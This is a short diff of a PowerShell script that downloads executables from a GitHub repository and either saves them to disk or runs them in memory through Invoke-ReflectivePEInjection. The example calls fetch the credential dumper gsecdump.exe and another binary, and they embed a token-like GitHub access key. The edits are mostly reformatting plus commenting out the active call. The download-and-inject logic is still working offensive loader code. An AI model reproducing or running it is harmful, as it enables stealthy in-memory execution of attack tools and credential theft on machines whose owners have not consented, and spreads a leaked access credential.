@@ -2940,9 +2940,9 @@ Use this script to download files from GitHub and store on disk or run in memory
     [String]
     $LocalFilePath,
 	
-	[Parameter(Position = 5, Mandatory=$True, ParameterSetName="ExecutionCommands")]
-	[String]
-	$CommandArgs
+    [Parameter(Position = 5, Mandatory=$True, ParameterSetName="ExecutionCommands")]
+    [String]
+    $CommandArgs
 
 
     )
@@ -2983,21 +2983,17 @@ Use this script to download files from GitHub and store on disk or run in memory
         $fileBytes = [System.Convert]::FromBase64String(($content.content))
 
         
-		if ($PsCmdlet.ParameterSetName -eq "WriteContentToDisk")
-		{
-			$outFile = $LocalFilePath + $GHFileName
-
-			[System.IO.File]::WriteAllBytes($outFile, $fileBytes)
+	if ($PsCmdlet.ParameterSetName -eq "WriteContentToDisk")
+	{
+		$outFile = $LocalFilePath + $GHFileName
+		[System.IO.File]::WriteAllBytes($outFile, $fileBytes)
+	}
 		
-		}
-		
-		if ($PsCmdlet.ParameterSetName -eq "ExecutionCommands")
-		{
-			# To run the exe in memory use Invoke-ReflectivePEInjection
-            Write-Host "Hello"
-			$output = Invoke-ReflectivePEInjection -PEBytes $fileBytes -ExeArgs $CommandArgs
-            #Write-Host $output
-		}		
+	if ($PsCmdlet.ParameterSetName -eq "ExecutionCommands")
+	{
+	    # To run the exe in memory use Invoke-ReflectivePEInjection
+            $output = Invoke-ReflectivePEInjection -PEBytes $fileBytes -ExeArgs $CommandArgs
+        }		
 		
 
         
@@ -3012,6 +3008,6 @@ Use this script to download files from GitHub and store on disk or run in memory
 
 #Invoke-GetContentFromGitHub -GHUser nnh100 -GHRepo uploads -GHPAT "zI5M2Q4ODM2MzBjMTRlNmJlZmE0YjA4ZmJmYjYyZjU2YmI1N2YwZA==" -GHFilePath "kali4/" -GHFileName "gsecdump.exe" -LocalFilePath "c:\temp\"
 
-Invoke-GetContentFromGitHub -GHUser nnh100 -GHRepo uploads -GHPAT "zI5M2Q4ODM2MzBjMTRlNmJlZmE0YjA4ZmJmYjYyZjU2YmI1N2YwZA==" -GHFilePath "kali4/" -GHFileName "whois64.exe" -CommandArgs "www.google.com"
+#Invoke-GetContentFromGitHub -GHUser nnh100 -GHRepo uploads -GHPAT "zI5M2Q4ODM2MzBjMTRlNmJlZmE0YjA4ZmJmYjYyZjU2YmI1N2YwZA==" -GHFilePath "kali4/" -GHFileName "whois64.exe" -CommandArgs "www.google.com"
 
 
